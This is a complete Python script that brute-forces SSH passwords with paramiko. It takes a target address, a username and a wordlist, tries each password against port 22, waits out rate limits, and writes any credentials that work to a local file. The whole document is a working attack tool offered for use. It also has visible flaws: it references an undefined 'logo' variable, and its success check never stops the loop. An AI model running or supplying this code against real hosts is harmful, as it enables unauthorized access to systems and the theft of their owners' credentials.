#!/usr/bin/python

import os
import time
import sys
from sys import stdout
from sys import platform
import socket
import paramiko


red="\033[0;31m"
green="\033[0;32m"
yellow="\033[0;33m"
blue="\033[0;34m"
purple="\033[0;35m"
cyan="\033[0;36m"
white="\033[0;37m"
nc="\033[00m"


ask  =     f"{green}[{white}?{green}] {yellow}"
success = f"{yellow}[{white}√{yellow}] {green}"
error  =    f"{blue}[{white}!{blue}] {red}"
info  =   f"{yellow}[{white}+{yellow}] {cyan}"
info2  =   f"{green}[{white}•{green}] {purple}"


def clear():
    os.system('clear')


def sprint(text):
    
    """Print lines slowly"""
    
    for line in text + '\n':
        stdout.write(line)
        stdout.flush()
        time.sleep(0.03)

TAB = '\t'

def main():
    try:
        host = input(f'{info2}{nc}Enter Targer Address: {yellow}')
        username = input(f'\n{info2}{nc}Enter SSH Username: {yellow}')
        path_file = input(f'\n{info2}{nc}Enter the Password.txt path: {yellow}')
        n = '\n'
        print(n)


        if os.path.exists(path_file) == False: 
            sprint(f'\n{error}No such file! Please enter the right path\n')
            time.sleep(0.5)
            clear()
            print(logo)
            main()

    except KeyboardInterrupt: 
        sprint(f'\n{success}Exit!\n')
        sys.exit()


    def sshbrute_forcer(host, username, password):
        
        """function brute force """

        port = '22'
        ssh = paramiko.SSHClient() 

        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        try:
            ssh.connect(hostname=host, username=username, password=password, timeout=3)
        except socket.timeout:
             

            print(f"\n{error}{red}Not found {host} or timeout connection. {host}\n")

            sys.exit(1)
            
        except paramiko.AuthenticationException:

            print(f'{error}[ATTEMPT] host {host} - login "{username}" - pass "{password}"')

        except paramiko.SSHException:


            print(f"{error} Too many queries wait a two minute.")

            time.sleep(120)


            return sshbrute_forcer(host, username, password)

        else:


            sprint(f"\n{success}[{port}] host: {host} login: {username} password: {password}\n")

            print(f"{success}I saved it to the file credentials.txt\n{info}You can check: cat credentials.txt\n")


            with open("credentials.txt", "a") as file:
                file.write(f'Host: {host}, Login: {username} Password: {password}\n')


    passlist = open(path_file).read().splitlines()


    for password in passlist:
        if sshbrute_forcer(host, username, password):
            break

main()
